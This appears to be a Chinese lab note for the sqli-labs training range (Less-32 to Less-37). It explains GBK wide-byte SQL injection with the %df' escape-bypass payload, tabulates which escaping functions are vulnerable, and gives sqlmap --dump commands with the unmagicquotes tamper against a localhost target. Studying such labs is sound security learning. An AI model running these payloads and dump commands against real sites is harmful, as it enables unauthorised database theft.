# 宽字节注入 (Less-32 ~ Less-37)

## 原理

当目标使用 **GBK/GB2312** 编码且开启了 `addslashes` / `magic_quotes` 时，单引号会被转义：

```
用户输入:   1'
转义后:     1\'           (%27 -> %5c%27)
```

利用 GBK 编码特性——在 `%27` 前加一个前导字节 `%df`（范围 0x81-0xFE）：

```
注入输入:   1%df'
转义后:     1%df%5c%27
GBK 解码:   1運'           (%df%5c 合并为一个汉字，%27 逃脱)
结果:       引号成功逃脱！
```

## 注入类型对照

| Less | 方法 | 转义函数 | 是否需要 tamper |
|------|------|---------|---------------|
| 32 | GET + 单引号 | magic_quotes | `--tamper=unmagicquotes` |
| 33 | GET + 单引号 | addslashes | `--tamper=unmagicquotes` |
| 34 | POST + 单引号 | addslashes | `--tamper=unmagicquotes` |
| 35 | GET + 数字型 | addslashes | 不需要（数字型无引号） |
| 36 | GET + 单引号 | mysql_real_escape_string | `--tamper=unmagicquotes` |
| 37 | POST + 单引号 | mysql_real_escape_string | `--tamper=unmagicquotes` |

## 转义函数与宽字节漏洞的关系

| 函数 | 受影响 | 条件 |
|------|-------|------|
| `addslashes()` | 是 | GBK 编码 |
| `magic_quotes_gpc` (PHP < 5.4) | 是 | GBK 编码 |
| `mysql_real_escape_string()` | 是 | 连接未设置 charset |
| `mysqli_real_escape_string()` + `set_charset('gbk')` | 是 | -- |
| PDO + `set_charset('gbk')` + 无 `ATTR_EMULATE_PREPARES` | 否 | 真正的预处理免疫 |

## 配置

```bash
TARGET="http://localhost:8080"
RESULTS_DIR="./results"
```

## 执行命令

### Less-32: magic_quotes 宽字节

```bash
sqlmap -u "$TARGET/Less-32/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=unmagicquotes \
    --dump --output-dir="$RESULTS_DIR/Less-32"
```

### Less-33: addslashes 宽字节

```bash
sqlmap -u "$TARGET/Less-33/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=unmagicquotes \
    --dump --output-dir="$RESULTS_DIR/Less-33"
```

### Less-34: POST + 宽字节

```bash
sqlmap -u "$TARGET/Less-34/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=unmagicquotes \
    --dump --output-dir="$RESULTS_DIR/Less-34"
```

### Less-35: 数字型（无需宽字节绕过）

> 数字型 SQL 没有引号需要突破，不需要 `--tamper=unmagicquotes`

```bash
sqlmap -u "$TARGET/Less-35/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --dump --output-dir="$RESULTS_DIR/Less-35"
```

### Less-36: mysql_real_escape_string 宽字节

```bash
sqlmap -u "$TARGET/Less-36/?id=1" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=unmagicquotes \
    --dump --output-dir="$RESULTS_DIR/Less-36"
```

### Less-37: POST + mysql_real_escape_string 宽字节

```bash
sqlmap -u "$TARGET/Less-37/" \
    --data="uname=admin&passwd=admin" \
    --batch --random-agent --threads=8 --dbms=mysql \
    --tamper=unmagicquotes \
    --dump --output-dir="$RESULTS_DIR/Less-37"
```

---

> 参考：[sqlmap 完整手册](sqlmap.md) | [注入类型详解](../notes/injection-types.md) | [靶场总览](../notes/overview.md)
